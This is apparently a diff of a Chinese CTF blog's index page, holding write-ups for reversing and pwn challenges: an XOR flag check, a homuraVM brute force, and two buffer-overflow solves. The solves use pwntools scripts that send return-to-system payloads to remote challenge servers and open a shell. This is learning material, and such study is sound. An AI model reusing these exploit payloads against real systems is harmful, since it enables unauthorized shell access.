+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char input[1024] = &#123; 0 &#125;;</span><br><span class="line">int aaa(char* b)</span><br><span class="line">&#123;</span><br><span class="line">	int v3 = 0,v2 = 0;</span><br><span class="line">	char key[] =&#123; 0,0,0,0x21, 0x5, 0x32, 0x43, 0x54, 0x21, 0x8, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1d, 0x32, 0x43, 0x54, 0x21, 0x7, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x55, 0x32, 0x43, 0x54, 0x21, 0x27, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1f, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x30, 0x32, 0x43, 0x54, 0x21, 0xb, 0x32, 0x43, 0x54, 0x21, 0x1b, 0x32, 0x43, 0x54 ,0x65&#125;;</span><br><span class="line">	int i = 0;</span><br><span class="line">	int i_ = 0;</span><br><span class="line">1:</span><br><span class="line">	int p__ = key[i ++];</span><br><span class="line">	if (p__== 0)</span><br><span class="line">		goto 1;</span><br><span class="line">	if (p__== 0x21)</span><br><span class="line">		goto 2;</span><br><span class="line">	if (p__== 0x32)</span><br><span class="line">		goto 3;</span><br><span class="line">	if (p__== 0x43)</span><br><span class="line">		goto 4;</span><br><span class="line">	if (p__== 0x54)</span><br><span class="line">		goto 5;</span><br><span class="line">	if (p__== 0x65)</span><br><span class="line">		goto 6;</span><br><span class="line">3:</span><br><span class="line">	v2 = input[i_ ++];</span><br><span class="line">	goto 7;</span><br><span class="line">4:</span><br><span class="line">	v3 = v3^0x66^v2;</span><br><span class="line">	goto 1;</span><br><span class="line">2:</span><br><span class="line">	v3 = key[i ++];</span><br><span class="line">	goto 7;</span><br><span class="line">7:</span><br><span class="line">	goto 1;</span><br><span class="line"></span><br><span class="line">5:</span><br><span class="line">	if (v3== 0)</span><br><span class="line">		goto 1;</span><br><span class="line">6:</span><br><span class="line"></span><br><span class="line">	return v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Please &quot;);</span><br><span class="line">	printf(&quot;input &quot;);</span><br><span class="line">	printf(&quot;flag:&quot;);</span><br><span class="line">	scanf(&quot;%s&quot;, input);</span><br><span class="line">	if(strlen(input)==15)</span><br><span class="line">		goto start;</span><br><span class="line">start:</span><br><span class="line">	int p = aaa(input);</span><br><span class="line">	if (p==0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;\no yes\n&quot;);</span><br><span class="line">		system(&quot;pause&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">end:</span><br><span class="line">	printf(&quot;\nnonono\n&quot;);</span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析可以发现，根据key中的值，对input进行处理之后如果<code>v3=0</code>的话就可以了。key中<code>0x21,****,0x32,0x43,0x54</code>构成一个循环，操作是使得<code>****</code>处的值异或input中的值再异或<code>0x66</code>等于<code>0</code>，所以<code>input=****^0x66</code>，运算脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key=[0x5,0x8,0x15,0x15,0x1d,0x7,0x39,0x55,0x27,0x15,0x1f,0x39,0x30,0xb,0x1b]</span><br><span class="line">flag=&quot;&quot;.join([chr(i^0x66)for i in key])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-sus-unpackme" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -583,281 +857,9 @@
 
 
   
-    <article id="post-十一欢乐赛-bss-stack" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/03/十一欢乐赛-bss-stack/" class="article-date">
-      <time datetime="2018-10-03T08:24:15.000Z" itemprop="datePublished">2018-10-03</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/03/十一欢乐赛-bss-stack/">十一欢乐赛-bss_stack</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>找了半天才找到在哪有栈溢出QAQ</p>
-<p>是在输入完用户名再输入1之后，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+11h] [ebp-17h]</span><br><span class="line"></span><br><span class="line">printf(&quot;Enter password: &quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">fgets(&amp;s, 100, stdin);</span><br><span class="line">puts(&quot;Authentification failed&quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">return sleep(1u);</span><br></pre></td></tr></table></figure>
-<p>fgets可以读入100个字符，s大小为0x17,所以输入超过0x17+4的话就可以覆盖返回地址。</p>
-<p>这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sh.recvuntil(&apos;User name : &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Action: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Enter password: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048500)+&apos;a&apos;*4+p32(0x08049dc8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>之后cat flag就可以得到flag了</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="CGCTF-when-cgctf-born" class="article article-type-CGCTF-when" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/02/cgctf-born/" class="article-date">
-      <time datetime="2018-10-02T08:37:30.000Z" itemprop="datePublished">2018-10-02</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/02/cgctf-born/">CGCTF-born</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p><a href="https://cgctf.nuptsast.com/challenges#Pwn" target="_blank" rel="noopener">题目地址</a></p>
-<p>看了欢乐赛里面的pwn题稍微了解了一些，但是再深入还是不会做，就想到先来cgctf把最简单的做了2333</p>
-<p>打开test.c:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">struct Student &#123;</span><br><span class="line">    char name[8];</span><br><span class="line">    int birth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    setbuf(stdin, 0);</span><br><span class="line">    setbuf(stdout, 0);</span><br><span class="line">    setbuf(stderr, 0);</span><br><span class="line">    struct Student student;</span><br><span class="line">    printf(&quot;What\&apos;s Your Birth?\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;student.birth);</span><br><span class="line">    while (getchar() != &apos;\n&apos;) ;</span><br><span class="line">    if (student.birth == 1926) &#123;</span><br><span class="line">        printf(&quot;You Cannot Born In 1926!\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;What\&apos;s Your Name?\n&quot;);</span><br><span class="line">    gets(student.name);</span><br><span class="line">    printf(&quot;You Are Born In %d\n&quot;, student.birth);</span><br><span class="line">    if (student.birth == 1926) &#123;</span><br><span class="line">        printf(&quot;You Shall Have Flag.\n&quot;);</span><br><span class="line">        system(&quot;cat flag&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;You Are Naive.\n&quot;);</span><br><span class="line">        printf(&quot;You Speed One Second Here.\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现生日输入不能为1926（-1s），但是必须要birth=1926时才能cat flag，于是看到输入name时的gets函数是没有限制的，但是name是一个8字符大小的数组，所以可以通过输入超过8位的字符来覆盖掉birth使其等于1926，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote(&apos;ctf.acdxvfsvd.net&apos;,1926)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;*8 + p32(1926))</span><br><span class="line">sh.interactive</span><br></pre></td></tr></table></figure>
-<p><strong><em>flag get</em></strong></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-十一欢乐赛-reverse" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/02/十一欢乐赛-reverse/" class="article-date">
-      <time datetime="2018-10-02T05:03:23.000Z" itemprop="datePublished">2018-10-02</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/02/十一欢乐赛-reverse/">十一欢乐赛-reverse</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="HelloReverse"><a href="#HelloReverse" class="headerlink" title="HelloReverse"></a>HelloReverse</h1><p>直接拖进ida，发现一个名为getflag的函数，点进去发现plain里存着flag。</p>
-<h1 id="HelloPython"><a href="#HelloPython" class="headerlink" title="HelloPython"></a>HelloPython</h1><p>pyc文件反编译一波直接运行，得不到flag分析一波程序。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if len(sys.argv) &lt; 5:</span><br><span class="line">    print(&quot;I can&apos;t give you flag :(&quot;)</span><br><span class="line">    sys.exit(0)</span><br></pre></td></tr></table></figure>
-<p>找到了一个判断条件，直接把exit(0)去掉</p>
-<p>再把输入flag的判断条件改为1：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if int(sys.argv[1]) &gt; 10 and Fibonacci(int(sys.argv[1])) == int(sys.argv[4]):</span><br><span class="line">    print(decrypt(15, &apos;MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH&apos;))</span><br></pre></td></tr></table></figure>
-<p>运行发现<code>n = None // 2</code>会报错<br>改成<code>n=1</code>试试发现输出了一个S应该就是flag的开头</p>
-<p>最后尝试出<code>n=33</code>时输出完整flag</p>
-<h1 id="XOR1"><a href="#XOR1" class="headerlink" title="XOR1"></a>XOR1</h1><p>ida打开发现直接把两个数组异或就能得到flag</p>
-<h1 id="XOR2"><a href="#XOR2" class="headerlink" title="XOR2"></a>XOR2</h1><p>和1差不多，区别是有一个数组是rand函数生成的，不过rand函数生成的随机数其实也是固定的。一开始用mac试了很久得不到flag，后来想起来不同系统随机数生成的也不一样，又用windows尝试，结果最后发现要用linux。</p>
-<h1 id="Maze"><a href="#Maze" class="headerlink" title="Maze"></a>Maze</h1><p>写过了maze就很容易了，wasd对应上下左右移动<br>地图如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OOOO*OOOO</span><br><span class="line">O1111O11O</span><br><span class="line">O1OOOO1OO</span><br><span class="line">O11O111OO</span><br><span class="line">OO111OO1O</span><br><span class="line">OOO1OO11O</span><br><span class="line">OOO111O1O</span><br><span class="line">OOO1O1111</span><br><span class="line">OOOOOOOO1</span><br></pre></td></tr></table></figure>
-<p>沿着1走到*得到flag 加上SUSCTF{}</p>
-<hr>
-<p>题目都很简单，其他方向的也都是当场百度就能做(pwn还没</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-cgctf-homuraVM" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/09/29/cgctf-homuraVM/" class="article-date">
-      <time datetime="2018-09-29T10:23:34.000Z" itemprop="datePublished">2018-09-29</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/29/cgctf-homuraVM/">CGCTF-homuraVM</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p><a href="https://cgctf.nuptsast.com/challenges#Re" target="_blank" rel="noopener">题目地址</a></p>
-<p>ida打开F5主函数代码,要求输入一个字符串s</p>
-<p>然后input[i+1]=s[i]<br>input[0]=s[len(s)-1]</p>
-<p>之后把两个很长的字符串分别赋值到v39,v40</p>
-<p>sub_8DC函数根据这两个字符串对input进行操作</p>
-<p>sub_8AA不知道是干啥的，后百度得知是反调试</p>
-<p>最后将处理过的input与给定的值对比，相同则ok</p>
-<p>value1和value2初始值为0 i为很长的字符串的下标</p>
-<p>读取到每个字符对应到的操作如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">case &quot;C&quot;:*value2-=2*(*value1&amp;*ipnut) ++i</span><br><span class="line">case &quot;G&quot;:--*value2                   ++i</span><br><span class="line">case &quot;M&quot;:*value2=*value1+*input      ++i</span><br><span class="line">case &quot;T&quot;:++*value2                   ++i</span><br><span class="line">case &quot;[&quot;:if *input!=0                ++i</span><br><span class="line">		  else                       i为]后一位</span><br><span class="line">case &quot;]&quot;:if *input!=0                i为[后一位</span><br><span class="line">          else                       ++i</span><br><span class="line">case &quot;a&quot;:--*value1                   ++i</span><br><span class="line">case &quot;h&quot;:input=input+4               ++i</span><br><span class="line">case &quot;m&quot;:++*input                    ++i</span><br><span class="line">case &quot;o&quot;:input=input-4               ++i</span><br><span class="line">case &quot;r&quot;:++*value1                   ++i</span><br><span class="line">case &quot;u&quot;:--*input                    ++i</span><br><span class="line">case &quot;v&quot;:*value2=*value1             ++i</span><br><span class="line">case &quot;&#123;&quot;:if *value2!=0               ++i</span><br><span class="line">		  else                       i为&#125;后一位</span><br><span class="line">case &quot;&#125;&quot;:if *value2!=0               i为&#123;后一位</span><br><span class="line">          else                       ++i</span><br></pre></td></tr></table></figure>
-<p>注意到h是对input进行下标+1的操作，所以以h为分界线把很长的字符串分割开如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">h[ur]ovMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaaMCh&#123;mG&#125; </span><br><span class="line">hv&#123;aG&#125;[ur]ovrrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrararaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrararrrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovararaaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrararraraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrarrrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaarrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrraaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovarraarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrraaarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaarrrrarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrraarrarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaraarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrraarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrraarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrraaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrrrrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaaarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrraaaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarraaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarraraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrararMCh&#123;mG&#125;</span><br></pre></td></tr></table></figure>
-<p>其中，每条都有的部分为hv{aG}[ur]ov……MCh{mG}</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[ur]： *value1=*input    *input减到0 </span><br><span class="line">&#123;aG&#125;： *value1-=*value2  *value2减到0 </span><br><span class="line">&#123;mG&#125;： *input+=*value2   *value2减到0 </span><br><span class="line">hv&#123;aG&#125;[ur]ov……MCh&#123;mG&#125;:</span><br><span class="line">input+=4</span><br><span class="line">*value2=*value1</span><br><span class="line">*value1-=*value2</span><br><span class="line">*value2=0</span><br><span class="line">*value1=*input</span><br><span class="line">*input=0</span><br><span class="line">input-=4</span><br><span class="line">*value2=*value1</span><br><span class="line">.</span><br><span class="line">.                           此部分仅ar数量及顺序不同，控制*value1</span><br><span class="line">.</span><br><span class="line">*value2=*value1+*input</span><br><span class="line">*value2-=2*(*value1&amp;*ipnut)</span><br><span class="line">input+=4</span><br><span class="line">*input+=*value2</span><br><span class="line">*value2=0</span><br></pre></td></tr></table></figure>
-<p>作用为：<br><code>input[i+1]=(input[i]+ar处理过的input[i+1])-2*(ar处理过的input[i+1]&amp;input[i])</code></p>
-<p>不知道怎么逆运算，只能尝试爆破了，打算先求出被ar处理过的input[i+1]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">final=[27,114,17,118,8,74,126,5,55,124,31,88,104,7,112,7,49,108,4,47,4,105,54,77,127,8,80,12,109,28,127,80,29,96,]</span><br><span class="line">ar=&apos;&apos;</span><br><span class="line">for i in range(33):</span><br><span class="line">	for s in string.printable:</span><br><span class="line">		if ord(s)+final[i]-2*(ord(s)&amp;final[i])==final[i+1]:</span><br><span class="line">			ar+=s</span><br><span class="line">print ar</span><br></pre></td></tr></table></figure>
-<p>得到ar处理后的flag从第二位开始为icg~B4{2KcG0oww6]h++m_{2wX\aqc/M}</p>
-<p>接下来根据ar的个数进行逆运算即可:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">operate=[+3,-2,0,-3,+2,-1,-5,-1,+1,-4,+1,0,-2,-2,-5,-2,+2,-2,-1,-1,-2,0,-2,-2,-2,-6,+3,+1,+1,-2,+2,+1,0]</span><br><span class="line">final=list(&apos;icg~B4&#123;2KcG0oww6]h++m_&#123;2wX\\aqc/M&#125;&apos;)</span><br><span class="line">for i in range(len(operate)):</span><br><span class="line">	final[i]=chr(operate[i]+ord(final[i]))</span><br><span class="line">flag=&apos;&apos;.join(final)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
-<p>得到flag第二位开始为<code>lag{D3v1L_H0mur4_f**k_y0uR_bra1N}</code></p>
-<p>很明显第一位为f 手动添加上</p>
-<p><strong><em>flag get</em></strong></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
     </nav>
   
 </div>
